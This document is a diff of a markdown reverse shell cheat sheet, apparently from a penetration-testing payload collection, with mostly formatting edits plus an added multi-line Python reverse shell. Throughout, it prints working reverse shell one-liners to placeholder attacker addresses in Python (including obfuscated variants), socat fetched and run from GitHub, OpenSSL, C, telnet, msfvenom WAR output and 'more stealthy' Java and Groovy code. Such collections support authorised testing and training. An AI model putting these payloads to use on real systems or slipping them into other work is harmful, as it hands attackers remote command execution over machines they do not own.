@@ -2,42 +2,42 @@
 
 ## Summary
 
-* [Reverse Shell](#reverse-shell)
-    * [Awk](#awk)
-    * [Automatic Reverse Shell Generator](#revshells)
-    * [Bash TCP](#bash-tcp)
-    * [Bash UDP](#bash-udp)
-    * [C](#c)
-    * [Dart](#dart)
-    * [Golang](#golang)
-    * [Groovy Alternative 1](#groovy-alternative-1)
-    * [Groovy](#groovy)
-    * [Java Alternative 1](#java-alternative-1)
-    * [Java Alternative 2](#java-alternative-2)
-    * [Java](#java)
-    * [Lua](#lua)
-    * [Ncat](#ncat)
-    * [Netcat OpenBsd](#netcat-openbsd)
-    * [Netcat BusyBox](#netcat-busybox)
-    * [Netcat Traditional](#netcat-traditional)
-    * [NodeJS](#nodejs)
-    * [OpenSSL](#openssl)
-    * [Perl](#perl)
-    * [PHP](#php)
-    * [Powershell](#powershell)
-    * [Python](#python)
-    * [Ruby](#ruby)
-    * [Socat](#socat)
-    * [Telnet](#telnet)
-    * [War](#war)
-* [Meterpreter Shell](#meterpreter-shell)
-    * [Windows Staged reverse TCP](#windows-staged-reverse-tcp)
-    * [Windows Stageless reverse TCP](#windows-stageless-reverse-tcp)
-    * [Linux Staged reverse TCP](#linux-staged-reverse-tcp)
-    * [Linux Stageless reverse TCP](#linux-stageless-reverse-tcp)
-    * [Other platforms](#other-platforms)
-* [Spawn TTY Shell](#spawn-tty-shell)
-* [References](#references)
+- [Reverse Shell](#reverse-shell)
+  - [Awk](#awk)
+  - [Automatic Reverse Shell Generator](#revshells)
+  - [Bash TCP](#bash-tcp)
+  - [Bash UDP](#bash-udp)
+  - [C](#c)
+  - [Dart](#dart)
+  - [Golang](#golang)
+  - [Groovy Alternative 1](#groovy-alternative-1)
+  - [Groovy](#groovy)
+  - [Java Alternative 1](#java-alternative-1)
+  - [Java Alternative 2](#java-alternative-2)
+  - [Java](#java)
+  - [Lua](#lua)
+  - [Ncat](#ncat)
+  - [Netcat OpenBsd](#netcat-openbsd)
+  - [Netcat BusyBox](#netcat-busybox)
+  - [Netcat Traditional](#netcat-traditional)
+  - [NodeJS](#nodejs)
+  - [OpenSSL](#openssl)
+  - [Perl](#perl)
+  - [PHP](#php)
+  - [Powershell](#powershell)
+  - [Python](#python)
+  - [Ruby](#ruby)
+  - [Socat](#socat)
+  - [Telnet](#telnet)
+  - [War](#war)
+- [Meterpreter Shell](#meterpreter-shell)
+  - [Windows Staged reverse TCP](#windows-staged-reverse-tcp)
+  - [Windows Stageless reverse TCP](#windows-stageless-reverse-tcp)
+  - [Linux Staged reverse TCP](#linux-staged-reverse-tcp)
+  - [Linux Stageless reverse TCP](#linux-stageless-reverse-tcp)
+  - [Other platforms](#other-platforms)
+- [Spawn TTY Shell](#spawn-tty-shell)
+- [References](#references)
 
 ## Reverse Shell
 
@@ -69,6 +69,7 @@ Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tc
 user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242
 user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
 ```
+
 ```powershell
 user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
 ```
@@ -92,65 +93,94 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c
 Linux only
 
 IPv4
+
 ```python
 export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 ```
+
 ```python
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 ```
+
 ```python
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 ```
+
 ```python
 python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
 ```
 
 IPv4 (No Spaces)
+
 ```python
 python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 ```
+
 ```python
 python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 ```
+
 ```python
 python -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
 ```
 
 IPv4 (No Spaces, Shortened)
+
 ```python
 python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("10.0.0.1",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
 ```
+
 ```python
 python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.0.0.1",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
 ```
+
 ```python
 python -c 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.0.0.1",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
 ```
 
 IPv4 (No Spaces, Shortened Further)
+
 ```python
 python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.0.0.1",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
 ```
+
 ```python
 python -c 'a=__import__;b=a("socket").socket;p=a("subprocess").call;o=a("os").dup2;s=b();s.connect(("10.0.0.1",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
 ```
+
 ```python
 python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("10.0.0.1",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
 ```
 
 IPv6
+
 ```python
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 ```
 
 IPv6 (No Spaces)
+
 ```python
 python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 ```
 
 IPv6 (No Spaces, Shortened)
+
 ```python
 python -c 'a=__import__;c=a("socket");o=a("os").dup2;p=a("pty").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
+```
+
+Multiliner
+
+```python
+import sys,socket,os,pty
+RHOST="10.10.10.10"
+RPORT=4488
+s=socket.socket()
+s.connect((RHOST,RPORT))
+[os.dup2(s.fileno(),fd)
+for fd in (0,1,2)]
+pty.spawn("/bin/sh")
 ```
 
 Windows only
@@ -221,6 +251,7 @@ ncat --udp 10.0.0.1 4242 -e /bin/bash
 ### OpenSSL
 
 Attacker:
+
 ```powershell
 user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
 user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
@@ -231,10 +262,11 @@ user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -
 ```
 
 TLS-PSK (does not rely on PKI or self-signed certificates)
+
 ```bash
 # generate 384-bit PSK
 # use the generated string as a value for the two PSK variables from below
-openssl rand -hex 48 
+openssl rand -hex 48
 # server (attacker)
 export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
 # client (victim)
@@ -281,6 +313,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ```
 
 #### Java Alternative 2
+
 **NOTE**: This is more stealthy
 
 ```java
@@ -293,6 +326,7 @@ thread.start();
 ```
 
 ### Telnet
+
 ```bash
 In Attacker machine start two listeners:
 nc -lvp 8080
@@ -308,7 +342,6 @@ telnet <Your_IP> 8080 | /bin/sh | telnet <Your_IP> 8081
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
 strings reverse.war | grep jsp # in order to get the name of the file
 ```
-
 
 ### Lua
 
@@ -368,6 +401,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ```
 
 #### Groovy Alternative 1
+
 **NOTE**: This is more stealthy
 
 ```java
@@ -394,11 +428,11 @@ int main(void){
     struct sockaddr_in revsockaddr;
 
     int sockt = socket(AF_INET, SOCK_STREAM, 0);
-    revsockaddr.sin_family = AF_INET;       
+    revsockaddr.sin_family = AF_INET;
     revsockaddr.sin_port = htons(port);
     revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");
 
-    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    connect(sockt, (struct sockaddr *) &revsockaddr,
     sizeof(revsockaddr));
     dup2(sockt, 0);
     dup2(sockt, 1);
@@ -407,7 +441,7 @@ int main(void){
     char * const argv[] = {"/bin/sh", NULL};
     execve("/bin/sh", argv, NULL);
 
-    return 0;       
+    return 0;
 }
 ```
 
@@ -438,7 +472,6 @@ main() {
 
 https://www.revshells.com/
 ![image](https://user-images.githubusercontent.com/44453666/115149832-d6a75980-a033-11eb-9c50-56d4ea8ca57c.png)
-
 
 ## Meterpreter Shell
 
@@ -551,14 +584,14 @@ www-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null
 www-data@debian:/dev/shm$ su - user
 Password: P4ssW0rD
 
-user@debian:~$ 
+user@debian:~$
 ```
 
 ## Fully interactive reverse shell on Windows
+
 The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.
 
 **ConPtyShell uses the function [CreatePseudoConsole()](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).**
-
 
 Server Side:
 
@@ -576,7 +609,7 @@ Offline version of the ps1 available at --> https://github.com/antonioCoco/ConPt
 
 ## References
 
-* [Reverse Bash Shell One Liner](https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner)
-* [Pentest Monkey - Cheat Sheet Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
-* [Spawning a TTY Shell](http://netsec.ws/?p=337)
-* [Obtaining a fully interactive shell](https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell)
+- [Reverse Bash Shell One Liner](https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner)
+- [Pentest Monkey - Cheat Sheet Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+- [Spawning a TTY Shell](http://netsec.ws/?p=337)
+- [Obtaining a fully interactive shell](https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell)
